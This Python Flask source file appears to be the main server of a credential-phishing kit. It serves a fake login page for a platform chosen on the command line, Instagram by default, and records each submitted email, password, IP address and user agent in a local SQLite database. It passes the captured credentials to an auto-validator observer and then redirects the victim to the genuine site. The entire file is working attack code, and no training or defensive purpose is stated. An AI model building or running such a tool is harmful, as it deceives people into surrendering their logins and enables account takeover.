import os
import sys
from flask import Flask, request, render_template, redirect
from waitress import serve
import sqlite3
from datetime import datetime

# Ensure project root is in sys.path
sys.path.append(os.getcwd())

from app.platforms import PhishingPageFactory
from app.observers import AutoValidatorObserver, credential_subject
from app.db import init_db

app = Flask(__name__, template_folder='app/templates', static_folder='app/static')

platform_arg = sys.argv[1] if len(sys.argv) > 1 else "instagram"
try:
    # Use Factory pattern
    PLATFORM_PAGE = PhishingPageFactory.create(platform_arg)
except ValueError as e:
    print(f"[ERROR] {e}")
    sys.exit(1)

DB_PATH = os.path.join(os.getcwd(), 'creds.db')

# Ensure database is initialized
init_db()


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        timestamp = datetime.utcnow().isoformat()

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''INSERT INTO credentials (email, password, ip, user_agent, timestamp, status) VALUES (?, ?, ?, ?, ?, ?)''', (email, password, ip, user_agent, timestamp, 'Pending'))
        conn.commit()
        conn.close()
        credential_subject.notify({
            "email": email,
            "password": password,
            "ip": ip,
            "user_agent": user_agent,
            "timestamp": timestamp
        })
        

        return redirect(PLATFORM_PAGE.get_redirect_url())
    
    return render_template(PLATFORM_PAGE.get_template_name())

if __name__ == '__main__':
    # Observer pattern: Attach the validator logic to the credential subject
    validator_observer = AutoValidatorObserver()
    credential_subject.attach(validator_observer)
    
    serve(app, host='0.0.0.0', port=5000)
